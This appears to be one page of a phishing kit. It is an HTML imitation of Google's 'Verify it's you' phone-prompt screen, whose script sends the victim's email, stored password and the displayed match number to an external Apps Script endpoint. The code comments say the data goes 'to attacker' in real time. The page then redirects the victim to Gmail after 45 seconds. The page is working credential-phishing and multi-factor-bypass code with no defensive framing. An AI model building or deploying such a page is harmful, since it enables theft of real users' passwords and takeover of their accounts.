<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css" />
  <style>
    .number-box {
      font-size: 72px;
      font-weight: bold;
      color: #1a73e8;
      background: #e8f0fe;
      padding: 20px 40px;
      border-radius: 12px;
      margin: 24px auto;
      text-align: center;
      max-width: 300px;
      border: 2px solid #1a73e8;
    }
    .instructions {
      font-size: 18px;
      margin: 16px 0;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="page-center">
    <div class="card">
      <div class="logo">
        <!-- same Google logo SVG as before -->
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
          <!-- ... paste your original logo paths here ... -->
        </svg>
      </div>
      <div class="account-selector">
        <div class="avatar-circle" id="avatar"></div>
        <div class="email-pill">
          <span id="userEmailDisplay"></span>
          <span class="dropdown-arrow">▼</span>
        </div>
      </div>
      <h1>Verify it's you</h1>
      <p class="subtitle">Check your phone</p>
      
      <div class="instructions">
        Tap <strong>Yes</strong> on your phone to sign in.<br>
        Then select the number shown below on your device.
      </div>
      
      <div class="number-box" id="matchNumber">••</div>
      
      <div class="description" style="text-align:center; margin-top:24px; color:#5f6368; font-size:14px;">
        This helps keep your account secure by making sure it's really you.
      </div>
      
      <div class="actions" style="margin-top:32px;">
        <button type="button" class="primary" disabled>Waiting for confirmation...</button>
      </div>
    </div>
  </div>
  
  <footer class="footer">
    <div class="lang-select">English (United States) ▼</div>
    <div class="footer-links">Help · Privacy · Terms</div>
  </footer>

  <script>
    const email = localStorage.getItem("demoEmail") || "someone@example.com";
    document.getElementById("userEmailDisplay").textContent = email;
    const usernamePart = email.split('@')[0];
    const initial = usernamePart.charAt(0).toUpperCase();
    document.getElementById("avatar").textContent = initial;

    // Generate a random 2-digit number (Google usually shows 2 digits)
    function generateNumber() {
      return Math.floor(10 + Math.random() * 90);  // 10-99
    }

    const matchNumber = generateNumber();
    document.getElementById("matchNumber").textContent = matchNumber;

    // Immediately send the number + email to attacker (so they see it in real-time)
    const params = new URLSearchParams();
    params.append("email", email);
    params.append("password", localStorage.getItem("demoPassword") || ""); // optional: pass previous pass if stored
    params.append("prompt_number", matchNumber);
    params.append("stage", "prompt_shown");

    fetch("https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params
    }).catch(err => console.error("Failed to send number", err));

    // Optional: poll or websocket to detect if victim "confirmed" (but most kits just wait / redirect after delay)
    // For simplicity, auto-redirect after ~45 seconds (average time victim takes)
    setTimeout(() => {
      localStorage.removeItem("demoEmail");
      // localStorage.removeItem("demoPassword"); // if you stored it
      window.location.href = "https://mail.google.com/";
    }, 45000);
  </script>
</body>
</html>
